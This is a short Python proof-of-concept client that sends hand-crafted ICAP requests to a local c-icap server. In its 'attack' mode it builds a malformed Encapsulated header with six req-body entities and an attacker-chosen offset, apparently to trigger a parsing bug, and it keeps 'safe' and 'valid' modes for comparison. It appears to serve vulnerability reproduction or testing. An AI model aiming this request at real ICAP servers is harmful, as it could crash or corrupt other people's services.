"""Send one crafted ICAP request to a loopback c-icap instance.

Usage: python3 client.py MODE [VALUE] [PORT]
  attack  REQMOD with six req-body entities (sixth offset = VALUE)
  safe    REQMOD with four req-body entities
  valid   REQMOD with one req-body entity and a terminating chunk
  options OPTIONS with six req-body entities and Connection: close
"""
import socket
import sys

mode = sys.argv[1] if len(sys.argv) > 1 else "attack"
value = sys.argv[2] if len(sys.argv) > 2 else "90"
port = int(sys.argv[3]) if len(sys.argv) > 3 else 1344

if mode == "valid":
    method, enc = "REQMOD", "req-body=0"
elif mode == "safe":
    method, enc = "REQMOD", "req-body=0, req-body=1, req-body=2, req-body=3"
elif mode == "options":
    method = "OPTIONS"
    enc = ("req-body=0, req-body=1, req-body=2, req-body=3, "
           "req-body=4, req-body=" + value)
else:
    method = "REQMOD"
    enc = ("req-body=0, req-body=1, req-body=2, req-body=3, "
           "req-body=4, req-body=" + value)

body = "0\r\n\r\n" if mode == "valid" else ""
req = (f"{method} icap://127.0.0.1:{port}/echo ICAP/1.0\r\n" +
       f"Host: 127.0.0.1:{port}\r\n" +
       ("Connection: close\r\n" if mode == "options" else "") +
       "Encapsulated: " + enc + "\r\n\r\n")

s = socket.create_connection(("127.0.0.1", port), timeout=5)
s.sendall((req + body).encode())
s.shutdown(socket.SHUT_WR)
data = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk
s.close()
print("method=%s request_bytes=%d body_bytes=%d response=%r" %
      (method, len(req), len(body), data[:240]))
